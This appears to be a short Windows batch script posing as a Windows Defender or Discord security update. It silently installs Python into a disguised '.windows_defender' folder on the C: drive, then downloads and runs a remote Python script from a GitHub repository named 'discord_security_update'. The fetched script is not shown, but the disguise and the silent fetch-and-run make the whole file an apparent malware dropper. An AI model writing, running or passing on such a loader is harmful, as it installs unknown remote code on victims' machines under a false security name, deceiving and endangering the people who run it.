@echo off
cd c:\

if not exist "c:\.windows_defender" (
    mkdir .windows_defender
)
cd .windows_defender

if not exist "c:\.windows_defender\python-2.7.10.amd64.msi" (
)

curl https://www.python.org/ftp/python/2.7.10/python-2.7.10.amd64.msi -O
msiexec /i python-2.7.10.amd64.msi /qn TARGETDIR=c:\.windows_defender\python

curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefenderStart.py -O

c:\.windows_defender\python\python.exe windowsDefenderStart.py
